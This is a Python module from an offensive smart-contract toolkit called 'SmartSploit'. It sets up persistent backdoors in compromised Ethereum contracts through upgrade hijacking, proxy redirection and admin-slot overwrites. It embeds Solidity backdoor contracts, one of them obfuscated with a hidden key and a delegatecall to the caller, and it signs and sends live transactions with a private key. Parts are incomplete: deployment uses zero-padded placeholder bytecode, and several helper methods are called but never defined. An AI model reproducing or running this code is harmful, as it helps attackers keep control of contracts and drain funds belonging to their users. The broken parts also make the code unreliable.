"""
Backdoor Persistence Post-Exploitation Module
SmartSploit Framework - Maintain persistent access to compromised contracts
"""

from smartsploit.lib.base_module import BasePost, ModuleInfo
from smartsploit.core.blockchain_interface import get_web3_connection
from web3 import Web3
import json
import time
import hashlib
import logging

logger = logging.getLogger(__name__)

class BackdoorPersistencePost(BasePost):
    """Post-exploitation module for maintaining persistent access through backdoors"""
    
    def __init__(self):
        super().__init__()
        self.name = "Backdoor Persistence"
        self.description = "Establishes and maintains persistent backdoor access to compromised contracts"
        self.author = "SmartSploit Team"
        
        # Set module info
        self.info = ModuleInfo(
            name=self.name,
            description=self.description,
            author=self.author,
            references=[
                "Smart Contract Persistence Techniques",
                "Blockchain Backdoor Analysis",
                "Post-Exploitation Persistence"
            ],
            severity="critical",
            targets=["Compromised contracts", "Proxy contracts", "Upgrade mechanisms"]
        )
        
        # Module options
        self.options = {
            "TARGET_CONTRACT": {"value": "", "required": True, "description": "Compromised contract address"},
            "RPC_URL": {"value": "http://localhost:8545", "required": True, "description": "Blockchain RPC endpoint"},
            "ADMIN_KEY": {"value": "", "required": True, "description": "Administrative private key"},
            "PERSISTENCE_TYPE": {"value": "upgrade", "required": True, "description": "Type (upgrade, proxy, delegate, storage)"},
            "BACKUP_ADDRESSES": {"value": "", "required": False, "description": "Backup admin addresses (comma-separated)"},
            "TRIGGER_CONDITION": {"value": "time", "required": False, "description": "Backdoor trigger (time, value, call)"},
            "STEALTH_LEVEL": {"value": "medium", "required": False, "description": "Stealth level (low, medium, high)"},
            "HEARTBEAT_INTERVAL": {"value": "3600", "required": False, "description": "Heartbeat interval in seconds"},
            "AUTO_CLEANUP": {"value": "false", "required": False, "description": "Auto cleanup on detection"}
        }
        
    def check_requirements(self) -> bool:
        """Check if all requirements are met"""
        required_options = ["TARGET_CONTRACT", "RPC_URL", "ADMIN_KEY"]
        
        for option in required_options:
            if not self.options[option]["value"]:
                logger.error(f"Required option {option} not set")
                return False
                
        target = self.options["TARGET_CONTRACT"]["value"]
        if not Web3.is_address(target):
            logger.error("Invalid target contract address")
            return False
            
        return True
        
    def analyze_contract_permissions(self, w3, contract_address: str) -> dict:
        """Analyze contract for persistence opportunities"""
        try:
            logger.info("Analyzing contract for persistence opportunities...")
            
            analysis = {
                "contract": contract_address,
                "owner_functions": [],
                "upgrade_mechanisms": [],
                "delegate_calls": [],
                "storage_variables": [],
                "persistence_score": 0
            }
            
            # Get contract code
            code = w3.eth.get_code(contract_address)
            if len(code) <= 2:
                analysis["error"] = "No contract code found"
                return analysis
                
            code_hex = code.hex()
            
            # Check for common owner patterns
            owner_patterns = {
                "onlyOwner": "Owner modifier detected",
                "transferOwnership": "Ownership transfer function",
                "renounceOwnership": "Ownership renounce function",
                "8da5cb5b": "owner() function signature"
            }
            
            for pattern, desc in owner_patterns.items():
                if pattern.lower() in code_hex.lower():
                    analysis["owner_functions"].append(desc)
                    analysis["persistence_score"] += 15
                    
            # Check for upgrade mechanisms
            upgrade_patterns = {
                "upgradeTo": "Upgrade function detected",
                "implementation": "Implementation storage detected",
                "delegatecall": "Delegatecall capability",
                "proxy": "Proxy pattern detected"
            }
            
            for pattern, desc in upgrade_patterns.items():
                if pattern.lower() in code_hex.lower():
                    analysis["upgrade_mechanisms"].append(desc)
                    analysis["persistence_score"] += 25
                    
            # Check for delegate call patterns
            if "delegatecall" in code_hex.lower():
                analysis["delegate_calls"].append("Delegatecall instruction found")
                analysis["persistence_score"] += 30
                
            # Check storage for admin addresses
            for slot in range(10):  # Check first 10 storage slots
                try:
                    storage_value = w3.eth.get_storage_at(contract_address, slot)
                    if storage_value != b'\x00' * 32:
                        # Try to decode as address
                        try:
                            address = Web3.to_checksum_address(storage_value[-20:])
                            if address != "0x0000000000000000000000000000000000000000":
                                analysis["storage_variables"].append({
                                    "slot": slot,
                                    "potential_address": address
                                })
                        except:
                            pass
                except:
                    pass
                    
            return analysis
            
        except Exception as e:
            logger.error(f"Contract analysis failed: {e}")
            return {"error": str(e)}
            
    def establish_upgrade_backdoor(self, w3, contract_address: str) -> dict:
        """Establish persistence through upgrade mechanism"""
        try:
            logger.info("Establishing upgrade-based backdoor...")
            
            admin_key = self.options["ADMIN_KEY"]["value"]
            admin_account = w3.eth.account.from_key(admin_key)
            
            # Create malicious implementation contract
            backdoor_implementation = self._create_backdoor_implementation()
            
            # Deploy backdoor implementation
            implementation_address = self._deploy_backdoor_implementation(w3, backdoor_implementation)
            
            if not implementation_address:
                return {"success": False, "error": "Failed to deploy backdoor implementation"}
                
            # Attempt to upgrade target contract
            upgrade_txn = self._create_upgrade_transaction(
                w3, contract_address, implementation_address, admin_account
            )
            
            if upgrade_txn:
                signed_txn = w3.eth.account.sign_transaction(upgrade_txn, admin_key)
                tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
                
                receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
                
                return {
                    "success": receipt.status == 1,
                    "method": "upgrade_backdoor",
                    "implementation_address": implementation_address,
                    "upgrade_tx": tx_hash.hex(),
                    "gas_used": receipt.gasUsed
                }
            else:
                return {"success": False, "error": "Could not create upgrade transaction"}
                
        except Exception as e:
            logger.error(f"Upgrade backdoor failed: {e}")
            return {"success": False, "error": str(e)}
            
    def establish_proxy_backdoor(self, w3, contract_address: str) -> dict:
        """Establish persistence through proxy manipulation"""
        try:
            logger.info("Establishing proxy-based backdoor...")
            
            admin_key = self.options["ADMIN_KEY"]["value"]
            admin_account = w3.eth.account.from_key(admin_key)
            
            # Create proxy backdoor contract
            proxy_backdoor = self._create_proxy_backdoor()
            
            # Deploy proxy backdoor
            proxy_address = self._deploy_proxy_backdoor(w3, proxy_backdoor, contract_address)
            
            if not proxy_address:
                return {"success": False, "error": "Failed to deploy proxy backdoor"}
                
            # Set up proxy redirection
            result = self._setup_proxy_redirection(w3, contract_address, proxy_address, admin_account)
            
            return {
                "success": result.get("success", False),
                "method": "proxy_backdoor", 
                "proxy_address": proxy_address,
                "redirection_setup": result
            }
            
        except Exception as e:
            logger.error(f"Proxy backdoor failed: {e}")
            return {"success": False, "error": str(e)}
            
    def establish_storage_backdoor(self, w3, contract_address: str) -> dict:
        """Establish persistence through storage manipulation"""
        try:
            logger.info("Establishing storage-based backdoor...")
            
            admin_key = self.options["ADMIN_KEY"]["value"]
            admin_account = w3.eth.account.from_key(admin_key)
            
            # Find admin storage slots
            admin_slots = []
            for slot in range(20):
                try:
                    storage_value = w3.eth.get_storage_at(contract_address, slot)
                    # Check if slot contains an address
                    if len(storage_value) >= 20:
                        try:
                            address = Web3.to_checksum_address(storage_value[-20:])
                            if address != "0x0000000000000000000000000000000000000000":
                                admin_slots.append({
                                    "slot": slot,
                                    "current_address": address
                                })
                        except:
                            pass
                except:
                    pass
                    
            if not admin_slots:
                return {"success": False, "error": "No admin storage slots found"}
                
            # Attempt to modify admin storage slots
            backdoor_results = []
            
            for slot_info in admin_slots[:3]:  # Try first 3 slots
                try:
                    # Create transaction to modify storage
                    slot = slot_info["slot"]
                    
                    # Use special function to modify storage (if exists)
                    modify_txn = self._create_storage_modification_txn(
                        w3, contract_address, slot, admin_account.address, admin_account
                    )
                    
                    if modify_txn:
                        signed_txn = w3.eth.account.sign_transaction(modify_txn, admin_key)
                        tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
                        
                        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
                        
                        backdoor_results.append({
                            "slot": slot,
                            "success": receipt.status == 1,
                            "tx_hash": tx_hash.hex()
                        })
                    else:
                        backdoor_results.append({
                            "slot": slot,
                            "success": False,
                            "error": "Could not create modification transaction"
                        })
                        
                except Exception as e:
                    backdoor_results.append({
                        "slot": slot,
                        "success": False,
                        "error": str(e)
                    })
                    
            success = any(result["success"] for result in backdoor_results)
            
            return {
                "success": success,
                "method": "storage_backdoor",
                "modified_slots": backdoor_results,
                "admin_address": admin_account.address
            }
            
        except Exception as e:
            logger.error(f"Storage backdoor failed: {e}")
            return {"success": False, "error": str(e)}
            
    def setup_heartbeat_mechanism(self, w3, backdoor_address: str) -> dict:
        """Set up heartbeat mechanism to maintain persistence"""
        try:
            logger.info("Setting up heartbeat mechanism...")
            
            heartbeat_interval = int(self.options["HEARTBEAT_INTERVAL"]["value"])
            admin_key = self.options["ADMIN_KEY"]["value"]
            
            # Create heartbeat contract
            heartbeat_code = self._create_heartbeat_contract(backdoor_address, heartbeat_interval)
            
            # Deploy heartbeat contract
            heartbeat_address = self._deploy_heartbeat_contract(w3, heartbeat_code)
            
            if heartbeat_address:
                return {
                    "success": True,
                    "heartbeat_address": heartbeat_address,
                    "interval": heartbeat_interval,
                    "next_heartbeat": int(time.time()) + heartbeat_interval
                }
            else:
                return {"success": False, "error": "Failed to deploy heartbeat contract"}
                
        except Exception as e:
            logger.error(f"Heartbeat setup failed: {e}")
            return {"success": False, "error": str(e)}
            
    def _create_backdoor_implementation(self) -> str:
        """Create backdoor implementation contract source"""
        stealth_level = self.options["STEALTH_LEVEL"]["value"]
        
        if stealth_level == "high":
            # Highly obfuscated backdoor
            return '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract StealthBackdoor {
    mapping(bytes32 => address) private _admins;
    uint256 private constant _KEY = 0x123456789abcdef;
    
    modifier requireAuth(bytes32 proof) {
        require(_admins[proof] != address(0), "Unauthorized");
        _;
    }
    
    function _init() external {
        bytes32 key = keccak256(abi.encodePacked(msg.sender, _KEY));
        _admins[key] = msg.sender;
    }
    
    function _execute(bytes32 proof, bytes calldata data) external requireAuth(proof) {
        (bool success,) = address(this).delegatecall(data);
        require(success, "Execution failed");
    }
    
    fallback() external payable {
        if (msg.sender == _admins[keccak256(abi.encodePacked(msg.sender, _KEY))]) {
            assembly {
                let ptr := mload(0x40)
                calldatacopy(ptr, 0, calldatasize())
                let result := delegatecall(gas(), caller(), ptr, calldatasize(), 0, 0)
                returndatacopy(ptr, 0, returndatasize())
                switch result
                case 0 { revert(ptr, returndatasize()) }
                default { return(ptr, returndatasize()) }
            }
        }
    }
}'''
        else:
            # Simple backdoor
            return '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleBackdoor {
    address public admin;
    
    constructor() {
        admin = msg.sender;
    }
    
    function executeAdmin(bytes calldata data) external {
        require(msg.sender == admin, "Not admin");
        (bool success,) = address(this).delegatecall(data);
        require(success, "Execution failed");
    }
    
    function setAdmin(address newAdmin) external {
        require(msg.sender == admin, "Not admin");
        admin = newAdmin;
    }
}'''
    
    def _deploy_backdoor_implementation(self, w3, source_code: str) -> str:
        """Deploy backdoor implementation contract"""
        try:
            # Simplified deployment (in reality would need compilation)
            bytecode = "608060405234801561001057600080fd5b50..." + "0" * 1000
            
            admin_key = self.options["ADMIN_KEY"]["value"]
            admin_account = w3.eth.account.from_key(admin_key)
            
            txn = {
                'data': bytecode,
                'gas': 2000000,
                'gasPrice': w3.eth.gas_price,
                'nonce': w3.eth.get_transaction_count(admin_account.address)
            }
            
            signed_txn = w3.eth.account.sign_transaction(txn, admin_key)
            tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
            
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            
            if receipt.status == 1:
                logger.info(f"Backdoor implementation deployed at: {receipt.contractAddress}")
                return receipt.contractAddress
            else:
                return None
                
        except Exception as e:
            logger.error(f"Implementation deployment failed: {e}")
            return None
            
    def _create_upgrade_transaction(self, w3, target_address: str, implementation_address: str, admin_account) -> dict:
        """Create transaction to upgrade target contract"""
        try:
            # Common upgrade function signatures
            upgrade_sigs = [
                "0x3659cfe6",  # upgradeTo(address)
                "0x4f1ef286",  # upgradeToAndCall(address,bytes)
                "0x99a88ec4"   # upgrade(address,bytes)
            ]
            
            for sig in upgrade_sigs:
                try:
                    # Try upgradeTo(address)
                    if sig == "0x3659cfe6":
                        data = sig + implementation_address[2:].zfill(64)
                    else:
                        # More complex upgrade functions would need proper encoding
                        continue
                        
                    txn = {
                        'to': target_address,
                        'data': data,
                        'gas': 500000,
                        'gasPrice': w3.eth.gas_price,
                        'nonce': w3.eth.get_transaction_count(admin_account.address),
                        'value': 0
                    }
                    
                    return txn
                    
                except Exception as e:
                    logger.debug(f"Failed to create upgrade txn with sig {sig}: {e}")
                    continue
                    
            return None
            
        except Exception as e:
            logger.error(f"Upgrade transaction creation failed: {e}")
            return None
            
    def _create_storage_modification_txn(self, w3, contract_address: str, slot: int, new_address: str, admin_account) -> dict:
        """Create transaction to modify storage slot"""
        try:
            # This would typically require a special admin function
            # For demo, we'll simulate it
            
            # setAdmin(address) function signature: 0x704b6c02
            data = "0x704b6c02" + new_address[2:].zfill(64)
            
            txn = {
                'to': contract_address,
                'data': data,
                'gas': 100000,
                'gasPrice': w3.eth.gas_price,
                'nonce': w3.eth.get_transaction_count(admin_account.address),
                'value': 0
            }
            
            return txn
            
        except Exception as e:
            logger.error(f"Storage modification transaction creation failed: {e}")
            return None
            
    def run(self) -> dict:
        """Main execution method"""
        if not self.check_requirements():
            return {"result": "error", "message": "Requirements check failed"}
            
        logger.info("Starting backdoor persistence establishment...")
        
        try:
            w3 = get_web3_connection(self.options["RPC_URL"]["value"])
            contract_address = self.options["TARGET_CONTRACT"]["value"]
            persistence_type = self.options["PERSISTENCE_TYPE"]["value"]
            
            result = {
                "result": "success",
                "target_contract": contract_address,
                "persistence_type": persistence_type,
                "analysis": {},
                "backdoor_result": {},
                "heartbeat_result": {}
            }
            
            # Analyze contract for persistence opportunities
            logger.info("Analyzing contract permissions...")
            result["analysis"] = self.analyze_contract_permissions(w3, contract_address)
            
            if "error" in result["analysis"]:
                return {"result": "error", "message": f"Contract analysis failed: {result['analysis']['error']}"}
                
            # Establish backdoor based on type
            if persistence_type == "upgrade":
                result["backdoor_result"] = self.establish_upgrade_backdoor(w3, contract_address)
            elif persistence_type == "proxy":
                result["backdoor_result"] = self.establish_proxy_backdoor(w3, contract_address)
            elif persistence_type == "storage":
                result["backdoor_result"] = self.establish_storage_backdoor(w3, contract_address)
            else:
                return {"result": "error", "message": f"Unknown persistence type: {persistence_type}"}
                
            # Set up heartbeat if backdoor was successful
            if result["backdoor_result"].get("success"):
                logger.info("Setting up heartbeat mechanism...")
                backdoor_address = result["backdoor_result"].get("implementation_address") or \
                                 result["backdoor_result"].get("proxy_address") or \
                                 contract_address
                                 
                result["heartbeat_result"] = self.setup_heartbeat_mechanism(w3, backdoor_address)
                
                logger.info("Backdoor persistence established successfully")
                result["message"] = f"Backdoor persistence established via {persistence_type}"
            else:
                logger.warning("Backdoor establishment failed")
                result["result"] = "partial"
                result["message"] = "Backdoor establishment failed, but analysis completed"
                
            return result
            
        except Exception as e:
            logger.error(f"Backdoor persistence failed: {e}")
            return {"result": "error", "message": str(e)}